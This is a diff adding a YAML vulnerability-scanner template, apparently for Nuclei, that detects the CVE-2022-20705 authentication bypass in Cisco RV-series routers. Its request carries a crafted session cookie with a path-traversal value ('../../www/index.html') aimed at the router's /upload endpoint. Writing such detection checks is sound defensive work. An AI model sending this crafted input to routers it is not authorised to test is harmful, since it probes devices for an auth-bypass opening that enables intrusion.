@@ -1,0 +1,35 @@
+id: CVE-2022-20705
+info:
+  name: CVE-2022-20705
+  author: Lennaert89
+  severity: critical
+  description: |
+    Multiple vulnerabilities in Cisco Small Business RV160, RV260,
+    RV340, and RV345 Series Routers could allow an attacker to do any of the
+    following: Execute arbitrary code, Elevate privileges, Execute arbitrary commands,
+    Bypass authentication and authorization protections, Fetch and run unsigned
+    software, Cause denial of service (DoS). For more information about these
+    vulnerabilities, see the Details section of this advisory.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-20705
+classification:
+  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+  cvss-score: 9.8
+  cve-id: CVE-2022-20705
+  cwe-id: CWE-787
+  tags: 
+    - cve
+    - cve2022
+    - cve-2022-20705
+    - cisco
+requests:
+  - method: GET
+    path:
+      - "{{baseURL}}/upload"
+    headers:
+      Cookie: "sessionid=../../www/index.html; sessionid={{rand_text_alphanumeric(16)}}"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 405
